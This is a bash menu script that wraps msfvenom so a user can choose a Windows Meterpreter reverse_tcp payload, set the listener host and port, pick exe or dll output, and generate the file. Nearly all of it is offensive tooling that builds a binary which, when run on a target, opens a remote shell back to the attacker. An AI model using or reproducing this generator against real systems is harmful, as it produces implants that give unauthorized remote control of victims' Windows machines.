#!/bin/bash
# Bash Menu Script Example

payload="windows/x64/meterpreter/reverse_tcp"
lhost="127.0.0.1"
lport="4444"
type="exe"
outfile="msfvenom.out"

function set_payload(){
clear
local PS3='Set Payload: '
local options=("windows/x64/meterpreter/reverse_tcp" "windows/meterpreter/reverse_tcp" )
select opt in "${options[@]}"
do
    case $opt in
        "windows/x64/meterpreter/reverse_tcp")
            payload="windows/x64/meterpreter/reverse_tcp"
            main_menu
            break
            ;;
        "windows/meterpreter/reverse_tcp")
            payload="windows/meterpreter/reverse_tcp"
            main_menu
            break
            ;;
        *) echo invalid option;;

     esac
done
}


function set_type(){
clear
local PS3='Set Type: '
local options=("exe" "dll" )
select opt in "${options[@]}"
do
    case $opt in
        "exe")
            type="exe"
            main_menu
            break
            ;;
        "dll")
            type="dll"
            main_menu
            break
            ;;
        *) echo invalid option;;
 
    esac
done
}



function main_menu(){
clear
PS3='Please enter your choice: '
options=("Payload: $payload" "LHOST=$lhost" "LPORT=$lport" "Type=$type" "Output File=$outfile" "Generate" "Quit" )
select opt in "${options[@]}"
do
    case $opt in
        "Payload: $payload")
            set_payload
            break
            ;;
        "LHOST=$lhost")
            echo -n "Enter lhost: "
            read lhost
            main_menu
            break
            ;;
        "LPORT=$lport")
            echo -n "Enter lport: "
            read lport
            main_menu
            break
            ;;
        "Type=$type")
           set_type
           break 
           ;;
        "Output File=$outfile")
            echo -n "Enter output file: "
            read outfile
            main_menu
            break
            ;;
        "Generate")
            echo "Generating: msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $type -o $outfile"
            msfvenom -p $payload LHOST=$lhost LPORT=$lport -f $type -o $outfile
            break
            ;;
        "Quit")
            break
            ;;

        *) echo invalid option;;
    esac
done
}
main_menu
